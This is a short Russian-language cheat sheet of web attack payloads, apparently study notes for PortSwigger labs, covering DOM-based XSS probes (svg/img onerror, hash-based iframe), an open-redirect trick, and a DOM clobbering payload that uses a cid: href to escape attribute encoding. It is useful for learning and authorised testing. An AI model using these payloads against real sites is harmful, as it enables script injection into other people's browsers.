# DOM-Based XSS
1. Проверить закрытие тегов: `"><svg onload=alert(1)>`
2. Проверить input-ы: `<img src=1 onerror=alert(1)>`
3. Проверить qvery параметры: `?name='<img src=1 onerror=alert(1)>//`
4. Приложение может ожидать от пользователя ввод после `#`, тогда можно использовать exploit сервер с телом: `<iframe src="https://<site>/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
5. Разработчик мог не обработать пользовательский ввод циклом: `<><><img src=1 onerror=alert(1)>`
## Open-redirection XSS

1. Может существовать возможность перенаправить пользователя на свой уязвимый ресурс, допусти через query параметр: `../?url=<my.site>`
# DOM clobbering
https://portswigger.net/web-security/dom-based/dom-clobbering
Если несколько html тегов имеют одинаковые атрибуты, то в window создаётся ключ-коллекция с этим атрибутом. Значит если мы создадим тег с атрибутом, который уже используется в скриптах самим приложением, то сможем проэксплуатировать уязвимость:
пусть существует js функционал:
```javascript 
...
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
...
```
тогда можно создать из пользовательского ввода следующий тег, который заменит собой переменную **`defaultAvatar`**:
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
где **cid** - спeцсимвол для частного случая, когда можно избежать кодировки ", который оставил разработчик. 
#### Стандартный пэйлоад:
```html
<a id=test1 name=url href=https://portswigger.com><a id=test1>
```